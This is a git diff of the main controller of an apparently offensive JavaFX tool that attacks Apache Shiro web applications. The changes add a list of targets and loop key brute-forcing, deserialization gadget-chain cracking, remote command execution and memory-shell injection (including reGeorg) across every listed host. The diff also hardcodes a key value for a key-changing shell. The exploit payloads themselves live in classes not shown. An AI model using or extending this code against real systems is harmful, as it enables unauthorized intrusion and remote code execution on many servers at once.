@@ -4,34 +4,25 @@ import com.summersec.attack.Encrypt.KeyGenerator;
 import com.summersec.attack.core.AttackService;
 import com.summersec.attack.entity.ControllersFactory;
 import com.summersec.attack.utils.Utils;
+
 import java.net.Authenticator;
 import java.net.InetSocketAddress;
 import java.net.PasswordAuthentication;
 import java.net.Proxy;
 import java.net.URL;
 import java.net.Proxy.Type;
-import java.util.HashMap;
-import java.util.List;
-import java.util.Map;
-import java.util.ResourceBundle;
+import java.util.*;
+
 import javafx.beans.value.ChangeListener;
 import javafx.beans.value.ObservableValue;
 import javafx.collections.FXCollections;
 import javafx.collections.ObservableList;
+import javafx.collections.ObservableSet;
 import javafx.event.ActionEvent;
 import javafx.fxml.FXML;
 import javafx.geometry.Insets;
 import javafx.geometry.Pos;
-import javafx.scene.control.Alert;
-import javafx.scene.control.Button;
-import javafx.scene.control.CheckBox;
-import javafx.scene.control.ComboBox;
-import javafx.scene.control.Label;
-import javafx.scene.control.MenuItem;
-import javafx.scene.control.RadioButton;
-import javafx.scene.control.TextArea;
-import javafx.scene.control.TextField;
-import javafx.scene.control.ToggleGroup;
+import javafx.scene.control.*;
 import javafx.scene.control.Alert.AlertType;
 import javafx.scene.layout.GridPane;
 import javafx.scene.layout.HBox;
@@ -99,15 +90,23 @@ public class MainController {
     @FXML
     public Button keygen;
 
+    @FXML
+    public Button addTarget;
+    @FXML
+    public ListView<String> targetList;
+
+    private List<AttackService> attackServices = null;
+    private ObservableSet<String> targets = FXCollections.observableSet();
+
     public MainController() {
     }
 
     @FXML
     void injectShellBtn(ActionEvent event) {
-        String memShellType = (String)this.memShellOpt.getValue();
+        String memShellType = this.memShellOpt.getValue();
         String shellPass = this.shellPassText.getText();
         String shellPath = this.shellPathText.getText();
-        if (AttackService.gadget != null ) {
+        if (AttackService.gadget != null) {
             this.attackService.injectMem(memShellType, shellPass, shellPath);
         } else {
             this.InjOutputArea.appendText(Utils.log("请先获取密钥和构造链"));
@@ -117,88 +116,101 @@ public class MainController {
 
     @FXML
     void executeCmdBtn(ActionEvent event) {
-//        String rememberMe = this.GadgetPayload(gadgetOpt, echoOpt, spcShiroKey);
-        if (AttackService.attackRememberMe != null) {
-            String command = this.exCommandText.getText();
-            if (!command.equals("")) {
-                this.attackService.execCmdTask(command);
+        for (AttackService as : this.attackServices) {
+            if (AttackService.attackRememberMe != null) {
+                String command = this.exCommandText.getText();
+                if (!command.isEmpty()) {
+                    as.execCmdTask(command);
+                } else {
+                    this.execOutputArea.appendText(Utils.log("请先输入获取的命令"));
+                }
             } else {
-                this.execOutputArea.appendText(Utils.log("请先输入获取的命令"));
+                this.execOutputArea.appendText(Utils.log("请先获取密钥和构造链"));
             }
-        } else {
-            this.execOutputArea.appendText(Utils.log("请先获取密钥和构造链"));
         }
-
     }
 
     @FXML
     void crackSpcGadgetBtn(ActionEvent event) {
+        if (this.attackServices == null) {
+            this.initAttacks();
+        }
         String spcShiroKey = this.shiroKey.getText();
-        if (this.attackService == null) {
-            this.initAttack();
-        }
-        if (!spcShiroKey.equals("")) {
-            boolean flag = this.attackService.gadgetCrack((String)this.gadgetOpt.getValue(), (String)this.echoOpt.getValue(), spcShiroKey);
-            if (!flag) {
-                this.logTextArea.appendText(Utils.log("未找到构造链"));
+        for (AttackService as : this.attackServices) {
+            if (!spcShiroKey.isEmpty()) {
+                boolean flag = as.gadgetCrack(this.gadgetOpt.getValue(), this.echoOpt.getValue(), spcShiroKey);
+                if (!flag) {
+                    this.logTextArea.appendText(Utils.log("未找到构造链"));
+                }
+            } else {
+                this.logTextArea.appendText(Utils.log("请先手工填入key或者爆破Shiro key"));
             }
-        } else {
-            this.logTextArea.appendText(Utils.log("请先手工填入key或者爆破Shiro key"));
         }
-
     }
 
     @FXML
     void crackGadgetBtn(ActionEvent event) {
+        if (this.attackServices == null) {
+            this.initAttacks();
+        }
         String spcShiroKey = this.shiroKey.getText();
-        if (this.attackService == null) {
-            this.initAttack();
-        }
-
-        boolean flag = false;
-        if (!spcShiroKey.equals("")) {
-            List<String> targets = this.attackService.generateGadgetEcho(this.gadgetOpt.getItems(), this.echoOpt.getItems());
-
-            for(int i = 0; i < targets.size(); ++i) {
-                String[] t = ((String)targets.get(i)).split(":");
-                String gadget = t[0];
-                String echo = t[1];
-                flag = this.attackService.gadgetCrack(gadget, echo, spcShiroKey);
-                if (flag) {
-                    break;
+        for (AttackService as : this.attackServices) {
+            boolean flag = false;
+            if (!spcShiroKey.isEmpty()) {
+                List<String> testTargets = as.generateGadgetEcho(this.gadgetOpt.getItems(), this.echoOpt.getItems());
+                for (String testTarget : testTargets) {
+                    String[] t = testTarget.split(":");
+                    String gadget = t[0];
+                    String echo = t[1];
+                    flag = as.gadgetCrack(gadget, echo, spcShiroKey);
+                    if (flag) {
+                        break;
+                    }
                 }
+            } else {
+                this.logTextArea.appendText(Utils.log("请先手工填入key或者爆破Shiro key"));
             }
-        } else {
-            this.logTextArea.appendText(Utils.log("请先手工填入key或者爆破Shiro key"));
+            if (!flag) {
+                this.logTextArea.appendText(Utils.log("未找到构造链"));
+            }
         }
-
-        if (!flag) {
-            this.logTextArea.appendText(Utils.log("未找到构造链"));
-        }
-
     }
 
     @FXML
     void crackSpcKeyBtn(ActionEvent event) {
-        this.initAttack();
-        if (this.attackService.checkIsShiro()) {
-            String spcShiroKey = this.shiroKey.getText();
-            if (!spcShiroKey.equals("")) {
-                this.attackService.simpleKeyCrack(spcShiroKey);
-            } else {
-                this.logTextArea.appendText(Utils.log("请输入指定密钥"));
+        this.initAttacks();
+        for (AttackService as : this.attackServices) {
+            if (as.checkIsShiro()) {
+                String spcShiroKey = this.shiroKey.getText();
+                if (!spcShiroKey.isEmpty()) {
+                    as.simpleKeyCrack(spcShiroKey);
+                } else {
+                    this.logTextArea.appendText(Utils.log("请输入指定密钥"));
+                }
             }
         }
-
     }
 
     @FXML
     void crackKeyBtn(ActionEvent event) {
-        this.initAttack();
-        if (this.attackService.checkIsShiro()) {
-            this.attackService.keysCrack();
+        this.initAttacks();
+        for (AttackService as : this.attackServices) {
+            if (as.checkIsShiro()) {
+                as.keysCrack();
+            }
         }
+    }
 
+    @FXML
+    void addTarget(ActionEvent event) {
+        String target = this.targetAddress.getText().trim();
+        if (!target.isEmpty()) {
+            if (!this.targets.contains(target)) {
+                this.targets.add(target);
+                this.targetList.getItems().setAll(this.targets);
+            }
+            this.targetAddress.clear();
+        }
     }
 
     @FXML
@@ -206,7 +218,46 @@ public class MainController {
         this.initToolbar();
         this.initComBoBox();
         this.initContext();
+        this.targetList.setItems(FXCollections.observableArrayList(this.targets));
+        this.targetList.getSelectionModel().setSelectionMode(SelectionMode.MULTIPLE);
         ControllersFactory.controllers.put(MainController.class.getSimpleName(), this);
+    }
+
+    public void initAttacks() {
+        this.attackServices = new ArrayList<>();
+        String shiroKeyWordText = this.shiroKeyWord.getText();
+        String httpTimeoutText = this.httpTimeout.getText();
+
+        // 自定义请求头
+        Map<String, String> myHeaders = getCustomHeader();
+        String postData = this.post_data.getText();
+        String reqMethod = this.methodOpt.getValue();
+        for (String target : this.targets) {
+//            this.logTextArea.appendText("[+] Testing: " + target);
+            AttackService as = new AttackService(reqMethod, target, shiroKeyWordText, httpTimeoutText, myHeaders, postData);
+            if (this.aesGcmOpt.isSelected()) {
+                AttackService.aesGcmCipherType = 1;
+            } else {
+                AttackService.aesGcmCipherType = 0;
+            }
+            this.attackServices.add(as);
+        }
+    }
+
+    private Map<String, String> getCustomHeader() {
+        Map<String, String> myHeaders = new HashMap<>();
+        if (!this.globalHeader.getText().isEmpty()) {
+            String[] headers = this.globalHeader.getText().split("&&&");
+            for (String s : headers) {
+                String[] header = s.split(":", 2);
+                if (header[0].equalsIgnoreCase("cookie")) {
+                    myHeaders.put("Cookie", header[1]);
+                } else {
+                    myHeaders.put(header[0], header[1]);
+                }
+            }
+        }
+        return myHeaders;
     }
 
     public void initAttack() {
@@ -214,11 +265,11 @@ public class MainController {
         String targetAddressText = this.targetAddress.getText();
         String httpTimeoutText = this.httpTimeout.getText();
         //自定义请求头
-        Map<String, String> myheader= new HashMap<>() ;
-        if(!this.globalHeader.getText().equals("")) {
+        Map<String, String> myheader = new HashMap<>();
+        if (!this.globalHeader.getText().equals("")) {
             String headers[] = this.globalHeader.getText().split("&&&");
 //        myheader(this.globalHeader.getText() -> this.globalHeader.getText().split(":"))
-            for (int i = 0; i < headers.length; i++ ) {
+            for (int i = 0; i < headers.length; i++) {
                 String header[] = headers[i].split(":", 2);
                 if (header[0].toLowerCase().equals("cookie")) {
                     myheader.put("Cookie", header[1]);
@@ -228,9 +279,9 @@ public class MainController {
             }
         }
 //        this.globalHeader = myheader
-        String postData = (String)this.post_data.getText();
-        String reqMethod = (String)this.methodOpt.getValue();
-        this.attackService = new AttackService(reqMethod, targetAddressText, shiroKeyWordText, httpTimeoutText,myheader,postData);
+        String postData = (String) this.post_data.getText();
+        String reqMethod = (String) this.methodOpt.getValue();
+        this.attackService = new AttackService(reqMethod, targetAddressText, shiroKeyWordText, httpTimeoutText, myheader, postData);
         if (this.aesGcmOpt.isSelected()) {
             AttackService.aesGcmCipherType = 1;
         } else {
@@ -250,13 +301,13 @@ public class MainController {
         this.methodOpt.setPromptText("GET");
         this.methodOpt.setValue("GET");
         this.methodOpt.setItems(methods);
-        ObservableList<String> gadgets = FXCollections.observableArrayList(new String[]{ "CommonsBeanutils1","CommonsBeanutils1_183", "CommonsCollections2", "CommonsCollections3", "CommonsCollectionsK1", "CommonsCollectionsK2", "CommonsBeanutilsString", "CommonsBeanutilsString_183", "CommonsBeanutilsAttrCompare", "CommonsBeanutilsAttrCompare_183", "CommonsBeanutilsPropertySource","CommonsBeanutilsPropertySource_183", "CommonsBeanutilsObjectToStringComparator", "CommonsBeanutilsObjectToStringComparator_183"});
+        ObservableList<String> gadgets = FXCollections.observableArrayList(new String[]{"CommonsBeanutils1", "CommonsBeanutils1_183", "CommonsCollections2", "CommonsCollections3", "CommonsCollectionsK1", "CommonsCollectionsK2", "CommonsBeanutilsString", "CommonsBeanutilsString_183", "CommonsBeanutilsAttrCompare", "CommonsBeanutilsAttrCompare_183", "CommonsBeanutilsPropertySource", "CommonsBeanutilsPropertySource_183", "CommonsBeanutilsObjectToStringComparator", "CommonsBeanutilsObjectToStringComparator_183"});
 //        ObservableList<String> gadgets = FXCollections.observableArrayList(new String[]{ "CommonsBeanutils1" ,"CommonsBeanutils1_183" ,"CommonsCollections2", "CommonsCollections3", "CommonsCollectionsK1", "CommonsCollectionsK2", "CommonsBeanutilsString", "CommonsBeanutilsAttrCompare", "CommonsBeanutilsPropertySource", "CommonsBeanutilsObjectToStringComparator"});
 //        ObservableList<String> gadgets = FXCollections.observableArrayList(new String[]{ "CommonsCollections2", "CommonsCollections3", "CommonsCollectionsK1", "CommonsCollectionsK2", "CommonsBeanutilsString", "CommonsBeanutilsAttrCompare", "CommonsBeanutilsPropertySource", "CommonsBeanutilsObjectToStringComparator"});
         this.gadgetOpt.setPromptText("CommonsBeanutilsString");
         this.gadgetOpt.setValue("CommonsBeanutilsString");
         this.gadgetOpt.setItems(gadgets);
-        ObservableList<String> echoes = FXCollections.observableArrayList(new String[]{"AllEcho","TomcatEcho", "SpringEcho"});
+        ObservableList<String> echoes = FXCollections.observableArrayList(new String[]{"AllEcho", "TomcatEcho", "SpringEcho"});
 //        ObservableList<String> echoes = FXCollections.observableArrayList(new String[]{"AllEcho","TomcatEcho", "TomcatEcho2", "SpringEcho"});
         this.echoOpt.setPromptText("TomcatEcho");
         this.echoOpt.setValue("TomcatEcho");
@@ -271,16 +322,16 @@ public class MainController {
         this.memShellOpt.getSelectionModel().selectedIndexProperty().addListener(new ChangeListener<Number>() {
             @Override
             public void changed(ObservableValue<? extends Number> observableValue, Number number, Number number2) {
-                if (((String)memShells.get(number2.intValue())).contains("reGeorg")  ) {
+                if (((String) memShells.get(number2.intValue())).contains("reGeorg")) {
                     MainController.this.shellPassText.setDisable(true);
                 } else {
                     MainController.this.shellPassText.setDisable(false);
                 }
-                if (((String)memShells.get(number2.intValue())).contains("ChangeShiroKey")){
+                if (((String) memShells.get(number2.intValue())).contains("ChangeShiroKey")) {
 //                    MainController.this.
                     MainController.this.shellPathText.setDisable(true);
                     MainController.this.shellPassText.setText("FcoRsBKe9XB3zOHbxTG0Lw==");
-                }else {
+                } else {
                     MainController.this.shellPathText.setDisable(false);
                 }
 
@@ -327,7 +378,7 @@ public class MainController {
             Button saveBtn = new Button("保存");
             saveBtn.setDefaultButton(true);
             if (currentProxy.get("proxy") != null) {
-                Proxy currProxy = (Proxy)currentProxy.get("proxy");
+                Proxy currProxy = (Proxy) currentProxy.get("proxy");
                 String proxyInfo = currProxy.address().toString();
                 String[] info = proxyInfo.split(":");
                 String hisIpAddress = info[0].replace("/", "");
@@ -342,7 +393,7 @@ public class MainController {
 
             saveBtn.setOnAction((e) -> {
                 if (disableRadio.isSelected()) {
-                    currentProxy.put("proxy", (Object)null);
+                    currentProxy.put("proxy", (Object) null);
                     this.proxyStatusLabel.setText("");
                     inputDialog.getDialogPane().getScene().getWindow().hide();
                 } else {
@@ -360,7 +411,7 @@ public class MainController {
                             }
                         });
                     } else {
-                        Authenticator.setDefault((Authenticator)null);
+                        Authenticator.setDefault((Authenticator) null);
                     }
 
                     currentProxy.put("username", userNameText.getText());
@@ -368,7 +419,7 @@ public class MainController {
                     ipAddress = IPText.getText();
                     String port = PortText.getText();
                     InetSocketAddress proxyAddr = new InetSocketAddress(ipAddress, Integer.parseInt(port));
-                    type = ((String)typeCombo.getValue()).toString();
+                    type = ((String) typeCombo.getValue()).toString();
                     Proxy proxy;
                     if (type.equals("HTTP")) {
                         proxy = new Proxy(Type.HTTP, proxyAddr);
